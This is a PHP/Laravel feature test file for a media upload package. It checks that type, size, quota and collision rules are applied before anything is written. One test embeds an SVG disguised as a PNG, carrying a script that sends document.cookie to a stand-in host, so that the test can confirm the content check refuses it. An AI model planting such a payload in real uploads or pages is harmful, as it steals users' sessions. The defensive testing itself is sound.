<?php

declare(strict_types=1);

namespace Kryption\MediaHub\Tests\Feature;

use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Kryption\MediaHub\Actions\UploadMedia;
use Kryption\MediaHub\Exceptions\QuotaExceeded;
use Kryption\MediaHub\Exceptions\UploadRejected;
use Kryption\MediaHub\Models\Media;
use Kryption\MediaHub\Tests\TestCase;
use Kryption\MediaHub\ValueObjects\UploadedPayload;

/**
 * UPLOADING A FILE.
 *
 * ⚠️ THIS FILE HOLDS THE ORDER AS MUCH AS THE RESULT. Validate, check the quota, write the
 * bytes, THEN record the row: every inversion has a precise cost, and the module this package
 * replaces had almost all of them — it wrote the file before knowing its type, and only checked
 * the extension against the name declared by the client.
 */
class UploadMediaTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('media');
        config()->set('mediahub.storage.disk', 'media');
    }

    private function upload(UploadedPayload $payload, array $context = []): Media
    {
        return $this->app->make(UploadMedia::class)($payload, $context);
    }

    /** @var array<int, string> the temporary files to clean up */
    private array $temporary = [];

    protected function tearDown(): void
    {
        foreach ($this->temporary as $path) {
            @unlink($path);
        }

        $this->temporary = [];

        parent::tearDown();
    }

    /**
     * A REAL IMAGE, WITHOUT GD.
     *
     * ⚠️ THE TESTS DO NOT REQUIRE AN EXTENSION THE PACKAGE DOES NOT REQUIRE.
     * `UploadedFile::fake()->image()` demands GD; yet the package must install on a host that
     * does not have it — that is the very reason `ConversionDriver::supports()` can answer no. A
     * suite demanding GD would lie about the portability of what it tests.
     *
     * So we build the PNG header by hand: `getimagesize()` reads only that, and `finfo` looks
     * only at the first bytes.
     */
    private function image(string $name = 'photo.png', int $width = 40, int $height = 30): UploadedPayload
    {
        $path = tempnam(sys_get_temp_dir(), 'mh').'-'.$name;
        file_put_contents($path, $this->png($width, $height));

        $this->temporary[] = $path;

        return UploadedPayload::fromLocalFile($path, $name);
    }

    /** The bytes of a PNG whose header announces those dimensions. */
    private function png(int $width, int $height): string
    {
        $ihdr = pack('NN', $width, $height).chr(8).chr(2).chr(0).chr(0).chr(0);

        return "\x89PNG\r\n\x1a\n"
            .$this->chunk('IHDR', $ihdr)
            .$this->chunk('IDAT', "\x08\x1d\x01\x00\x00\xff\xff\x00\x00\x00\x02\x00\x01")
            .$this->chunk('IEND', '');
    }

    private function chunk(string $type, string $data): string
    {
        return pack('N', strlen($data)).$type.$data.pack('N', crc32($type.$data));
    }

    // ── The nominal case ─────────────────────────────────────────────────────

    public function test_a_file_is_uploaded_and_recorded(): void
    {
        $media = $this->upload($this->image(), ['directory' => 'invoices/2026']);

        $this->assertSame('invoices/2026/photo.png', $media->path);
        $this->assertSame('media', $media->disk);
        $this->assertSame('image/png', $media->mime_type);
        $this->assertSame('image', $media->type);
        $this->assertSame(40, $media->width);
        $this->assertSame(30, $media->height);

        Storage::disk('media')->assertExists('invoices/2026/photo.png');
    }

    /** ⚠️ THE DISPLAYED NAME AND THE NAME ON DISK ARE TWO DIFFERENT THINGS. */
    public function test_the_displayed_name_and_the_file_name_are_distinct(): void
    {
        $media = $this->upload($this->image('Annual Report 2026.png'));

        $this->assertSame('Annual Report 2026', $media->name);
        $this->assertSame('annual-report-2026.png', $media->file_name);
    }

    /** ⚠️ THE PATH IS A PATH, NEVER A URL. */
    public function test_the_recorded_path_is_not_a_url(): void
    {
        $media = $this->upload($this->image(), ['directory' => 'invoices']);

        $this->assertStringNotContainsString('http', $media->path);
        $this->assertStringStartsWith('invoices/', $media->path);
    }

    public function test_the_content_checksum_is_recorded(): void
    {
        $media = $this->upload($this->image());

        $this->assertMatchesRegularExpression('/^[0-9a-f]{64}$/', (string) $media->checksum);
    }

    // ── Refusals ─────────────────────────────────────────────────────────────

    /** ⚠️ THE CHECK THAT CATCHES THE DISGUISE: a `.jpg` that is not one. */
    public function test_an_extension_at_odds_with_the_content_is_refused(): void
    {
        $path = tempnam(sys_get_temp_dir(), 'fake').'.jpg';
        file_put_contents($path, "This is text, not an image.\n");

        $this->expectException(UploadRejected::class);

        try {
            $this->upload(UploadedPayload::fromLocalFile($path, 'photo.jpg'));
        } finally {
            @unlink($path);
        }
    }

    /**
     * ⚠️ AN SVG DISGUISED AS A PNG — and it is the only case the allow-list does not see.
     *
     * The first version of this test uploaded a file named `logo.svg`: it was refused by the
     * extension allow-list, so it proved NOTHING about the content check. A mutation showed it —
     * the validator reduced to the declared extension let it pass green. Here the file is called
     * `logo.png`: only reading the CONTENT can recognise it.
     *
     * ⚠️ AND THE STAKE IS REAL: an SVG carries scripts. Served inline from our domain under an
     * image extension, it runs in the context of our users.
     */
    public function test_an_svg_disguised_as_an_image_is_refused(): void
    {
        $path = tempnam(sys_get_temp_dir(), 'svg').'.png';
        file_put_contents(
            $path,
            '<?xml version="1.0" encoding="UTF-8"?>'
            .'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
            .'<script>fetch("https://elsewhere.test/?c="+document.cookie)</script>'
            .'</svg>'
        );

        $this->expectException(UploadRejected::class);

        try {
            $this->upload(UploadedPayload::fromLocalFile($path, 'logo.png'));
        } finally {
            @unlink($path);
        }
    }

    /** And an honest SVG is still refused by the allow-list, earlier. */
    public function test_an_svg_declared_as_such_is_refused_too(): void
    {
        $path = tempnam(sys_get_temp_dir(), 'svg').'.svg';
        file_put_contents($path, '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"/>');

        $this->expectException(UploadRejected::class);

        try {
            $this->upload(UploadedPayload::fromLocalFile($path, 'logo.svg'));
        } finally {
            @unlink($path);
        }
    }

    public function test_an_extension_outside_the_allow_list_is_refused(): void
    {
        $path = tempnam(sys_get_temp_dir(), 'exe').'.exe';
        file_put_contents($path, 'MZ');

        $this->expectException(UploadRejected::class);

        try {
            $this->upload(UploadedPayload::fromLocalFile($path, 'virus.exe'));
        } finally {
            @unlink($path);
        }
    }

    /** ⚠️ A FILE WITHOUT AN EXTENSION IS REFUSED: two production files died of it. */
    public function test_a_file_without_an_extension_is_refused(): void
    {
        $path = tempnam(sys_get_temp_dir(), 'bare');
        file_put_contents($path, 'contents');

        $this->expectException(UploadRejected::class);

        try {
            $this->upload(UploadedPayload::fromLocalFile($path, 'file-without-extension'));
        } finally {
            @unlink($path);
        }
    }

    public function test_a_file_that_is_too_large_is_refused(): void
    {
        config()->set('mediahub.uploads.max_size', 1);

        $this->expectException(UploadRejected::class);

        $this->upload(UploadedPayload::fromUploadedFile(
            UploadedFile::fake()->create('large.pdf', 2048, 'application/pdf')
        ));
    }

    /** ⚠️ THE DECOMPRESSION BOMB: measured BEFORE decoding, on the header. */
    public function test_an_image_with_outsized_dimensions_is_refused(): void
    {
        config()->set('mediahub.uploads.max_image_pixels', 100);

        $this->expectException(UploadRejected::class);

        $this->upload($this->image('huge.png', 500, 500));
    }

    /** ⚠️ WHAT IS REFUSED LEAVES NOTHING ON THE STORAGE. */
    public function test_a_refusal_writes_no_byte(): void
    {
        config()->set('mediahub.uploads.max_size', 1);

        try {
            $this->upload(UploadedPayload::fromUploadedFile(
                UploadedFile::fake()->create('large.pdf', 2048, 'application/pdf')
            ));
        } catch (UploadRejected) {
            // expected
        }

        $this->assertSame([], Storage::disk('media')->allFiles());
        $this->assertSame(0, Media::query()->withoutMediaScope()->count());
    }

    // ── The quota ────────────────────────────────────────────────────────────

    /** ⚠️ CHECKED BEFORE THE WRITE, NEVER AFTER. */
    public function test_an_exceeded_quota_refuses_before_writing(): void
    {
        $this->app->singleton(\Kryption\MediaHub\Contracts\QuotaPolicy::class, fn () => new class implements \Kryption\MediaHub\Contracts\QuotaPolicy
        {
            public function limitInBytes(?string $scopeKey): ?int
            {
                return 10;
            }

            public function usedInBytes(?string $scopeKey): int
            {
                return 10;
            }

            public function allows(?string $scopeKey, int $incomingBytes): bool
            {
                return false;
            }
        });

        try {
            $this->upload($this->image());
            $this->fail('The upload should have been refused.');
        } catch (QuotaExceeded) {
            // expected
        }

        $this->assertSame([], Storage::disk('media')->allFiles());
    }

    // ── Collisions ───────────────────────────────────────────────────────────

    /**
     * ⚠️ THE ORIGINAL MODULE'S MOST EXPENSIVE DEFECT. Two DIFFERENT files with the same name in
     * the same folder: the second overwrote the first on the storage, while creating a second
     * row naming the same path.
     */
    public function test_two_different_files_with_the_same_name_do_not_overwrite_each_other(): void
    {
        $first = $this->upload($this->image('photo.png', 40, 30), ['directory' => 'invoices']);
        $second = $this->upload($this->image('photo.png', 80, 60), ['directory' => 'invoices']);

        $this->assertNotSame($first->path, $second->path);

        Storage::disk('media')->assertExists($first->path);
        Storage::disk('media')->assertExists($second->path);
    }

    /**
     * ⚠️ IDENTICAL CONTENT, ON THE OTHER HAND, IS REUSED — that is the shipped default, and it
     * is judged on the CHECKSUM, not on the name.
     */
    public function test_identical_content_is_reused(): void
    {
        $path = tempnam(sys_get_temp_dir(), 'dup').'.pdf';
        file_put_contents($path, '%PDF-1.4 identical content');

        try {
            $first = $this->upload(UploadedPayload::fromLocalFile($path, 'a.pdf'));
            $second = $this->upload(UploadedPayload::fromLocalFile($path, 'b.pdf'));

            $this->assertSame($first->id, $second->id);
            $this->assertSame(1, Media::query()->count());
        } finally {
            @unlink($path);
        }
    }

    // ── Scoping ──────────────────────────────────────────────────────────────

    public function test_the_uploaded_media_carries_the_scope_given_by_the_caller(): void
    {
        $media = $this->upload($this->image(), ['scope' => 'clients/durand']);

        $this->assertSame('clients/durand', $media->fresh()->getAttribute('scope_key'));
    }

    // ── Inspection ───────────────────────────────────────────────────────────

    /** ⚠️ WE REFUSE RATHER THAN ASSUME: what cannot be opened cannot be validated. */
    public function test_a_payload_that_cannot_be_inspected_is_refused(): void
    {
        $this->expectException(UploadRejected::class);

        $this->upload(UploadedPayload::fromUrl('https://example.test/photo.jpg'));
    }
}
